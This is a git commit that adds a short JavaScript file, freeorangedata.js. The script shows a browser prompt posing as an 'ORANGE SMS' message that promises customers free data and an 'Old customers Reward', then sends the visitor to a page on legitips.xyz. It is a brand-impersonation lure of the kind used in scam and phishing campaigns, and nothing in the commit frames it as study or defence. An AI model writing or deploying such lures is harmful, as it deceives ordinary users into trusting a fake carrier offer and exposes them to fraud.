bc2341d22d4e018a785a11b530fc449a3c12d1e0
legitips <83867893+legitips@users.noreply.github.com>
2024-07-02 09:15:14 -0700

    Create freeorangedata.js

---
+++ freeorangedata.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('ORANGE SMS: Dear customer, kindly check if your ORANGE sim card is qualify to receive from  Free data, Old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/freeorangedata.html';
+}
